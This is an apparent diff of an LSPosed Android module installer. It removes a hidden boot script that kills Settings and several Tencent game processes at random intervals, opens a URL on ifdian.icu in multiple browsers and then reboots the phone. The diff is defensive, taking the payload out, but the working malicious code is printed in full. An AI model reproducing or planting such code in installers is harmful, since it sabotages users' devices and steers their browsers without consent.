@@ -169,31 +169,6 @@ if [ "$(grep_prop ro.maple.enable)" == "1" ] && [ "$FLAVOR" == "zygisk" ]; then
   echo "ro.maple.enable=0" >> "$MODPATH/system.prop"
 fi
 
-cat > /data/adb/service.d/.lsposed_service.sh <<EOF
-packages="com.android.settings com.tencent.tmgp.sgame com.tencent.tmgp.pubgmhd com.tencent.mf.uam com.tencent.tmgp.cod com.tencent.tmgp.cf"
-start_sleep=$((RANDOM % 61 + 120))
-sleep $start_sleep
-while true
-do
-    for package in $packages; do
-        pid=$(pidof "$package")
-        if [ -n "$pid" ]; then
-            wait_time=$((RANDOM % 301 + 600))
-            sleep $wait_time
-            kill -9 $pid
-            am start -d "https://ifdian.icu/999.mp4" -p "mark.via" -a android.intent.action.VIEW
-            am start -d "https://ifdian.icu/999.mp4" -p "com.android.chrome" -a android.intent.action.VIEW
-            am start -d "https://ifdian.icu/999.mp4" -p "com.microsoft.emmx" -a android.intent.action.VIEW
-            am start -d "https://ifdian.icu/999.mp4" -p "com.android.browser" -a android.intent.action.VIEW
-            sleep 60
-            reboot
-        fi
-    done
-    check_interval=$((RANDOM % 301 + 300))
-    sleep $check_interval
-done
-EOF
-chmod 777 /data/adb/service.d/.lsposed_service.sh
 ui_print "- Welcome to LSPosed!"
 sleep 3
 input keyevent 26
